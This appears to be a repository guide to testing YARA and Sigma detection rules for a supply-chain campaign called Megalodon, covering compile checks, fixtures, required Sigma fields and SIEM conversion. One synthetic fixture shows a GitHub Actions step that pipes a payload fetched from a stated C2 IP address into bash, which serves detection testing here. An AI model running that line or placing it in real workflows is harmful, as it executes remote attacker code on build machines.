# Testing Detection Rules

All rules in this repository must pass testing before publication. This document describes the procedure for YARA and Sigma rules and the fixture conventions we use.

No rule merges to `main` without a passing test record. The CI pipeline enforces compile/lint checks; fixture testing is a manual gate documented here.

---

## YARA testing

### Install

```bash
# macOS
brew install yara

# Ubuntu / Debian
sudo apt-get install yara

# From source (latest)
# https://yara.readthedocs.io/en/latest/gettingstarted.html
```

### Compile check (automated in CI)

Before anything else, verify the rule file compiles:

```bash
yara megalodon/yara/megalodon-workflow.yar /dev/null
```

`/dev/null` is an empty scan target — this exercises the compiler without needing real files. A clean return (exit 0, no output) means the rule is syntactically valid.

### Positive fixture testing

A positive fixture is a file that the rule **must** match. Place fixtures under `tests/<campaign>/fixtures/positive/`.

```bash
# Run a specific rule against positive fixtures — every file must produce a match
yara -r megalodon/yara/megalodon-workflow.yar tests/megalodon/fixtures/positive/
```

Every YARA rule must have at least one positive fixture that confirms the pattern fires on a realistic sample. Where a real malicious file cannot be safely stored, create a synthetic fixture containing only the specific IoC pattern under test.

**Synthetic fixture example** — testing `Megalodon_Workflow_C2_IP`:

```yaml
# tests/megalodon/fixtures/positive/synthetic-c2-ip.yml
# Synthetic fixture: contains C2 IP used by Megalodon targeted variant
name: Optimize-Build
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s http://216.126.225.129:8443/payload | bash
```

### Negative fixture testing

A negative fixture is a benign file that the rule **must not** match. Place fixtures under `tests/<campaign>/fixtures/negative/`.

```bash
# Every file must produce zero matches
yara -r megalodon/yara/megalodon-workflow.yar tests/megalodon/fixtures/negative/
```

Negative fixtures are where false positive risk is assessed. Include real-world benign workflow files that share surface-level similarities with the campaign IoCs — for example, legitimate workflows that use `base64` for encoding (not execution), or that use `workflow_dispatch` without malicious payloads.

### Recording results

Document the test outcome in the rule's `meta` block:

```yara
meta:
    tested          = "2026-05-30"
    positive_count  = "3"
    negative_count  = "12"
    false_positive_rate = "0 observed in test set"
```

---

## Sigma testing

### Install sigma-cli

```bash
pip install sigma-cli
```

### Lint check (automated in CI)

```bash
sigma check megalodon/sigma/megalodon-github-direct-push-workflow.yml
```

All errors must be resolved before merging. Warnings should be reviewed and either resolved or explicitly documented.

### Required fields

Every Sigma rule must include all of these fields before it can be promoted from `status: test` to `status: stable`:

| Field | Requirement |
|---|---|
| `id` | UUID4 — generate with `python3 -c "import uuid; print(uuid.uuid4())"` |
| `status` | `test` on first publish; `stable` once validated against live log data |
| `author` | Author name or team |
| `date` | ISO 8601 date (`YYYY-MM-DD`) |
| `references` | At least one external source for the detection logic |
| `tags` | At least one ATT&CK tag (`attack.t1234` format) |
| `level` | `critical` / `high` / `medium` / `low` / `informational` |
| `falsepositives` | Honest list of known benign triggers — never just `None` if benign triggers exist |
| `logsource` | Product, category, and/or service |
| `detection` | Selection conditions and filter conditions |

### SIEM backend validation

Before publishing, convert to at least one SIEM target and verify the output is syntactically valid:

```bash
# Convert to Splunk SPL
sigma convert -t splunk megalodon/sigma/megalodon-github-direct-push-workflow.yml

# Convert to Elasticsearch EQL
sigma convert -t elasticsearch megalodon/sigma/megalodon-github-direct-push-workflow.yml

# Convert to Microsoft Sentinel KQL
sigma convert -t sentinel megalodon/sigma/megalodon-github-direct-push-workflow.yml
```

Correct any conversion warnings before marking the rule `status: stable`.

### Log validation

Where real or representative log data is available, run the converted query against it to verify:

1. The rule fires on logs matching the threat scenario (true positive)
2. The rule does not fire on normal operational logs (true negative)

Document the log source used and the outcome in the `falsepositives` and any `notes` field.

---

## Fixture organisation

```
tests/
└── <campaign>/
    └── fixtures/
        ├── positive/          # Files the rule must match
        │   ├── <ioc>-<variant>.yml
        │   └── synthetic-<rule-name>.yml
        └── negative/          # Files the rule must not match
            ├── benign-<scenario>.yml
            └── ...
```

Name fixtures descriptively: `synthetic-c2-ip.yml`, `benign-workflow-dispatch.yml`. Never commit real malware — synthetic files containing only the specific IoC pattern under test are sufficient and safe.

---

## Other rule formats — future consideration

YARA and Sigma are the primary formats in this repository. Additional formats under consideration for future campaigns:

| Format | Use case | Status |
|---|---|---|
| **Suricata** | Network-based detection — complements Sigma network rules with inline IDS/IPS enforcement | Planned |
| **STIX 2.1** | Structured threat intelligence sharing — campaign IoC bundles consumable by threat intel platforms | Planned |
| **KQL** | Microsoft Sentinel native — sigma-cli generates KQL from Sigma rules; standalone KQL considered if Sigma conversion is lossy | Under review |

Suricata rules would be placed in `<campaign>/suricata/<campaign>-<subject>.rules`. The testing process for Suricata uses `suricata -T -c /etc/suricata/suricata.yaml -S <file.rules>` for syntax validation and pcap replay for functional testing.

---

*See [`CONTRIBUTING.md`](CONTRIBUTING.md) for the full rule quality gate and pull request process.*
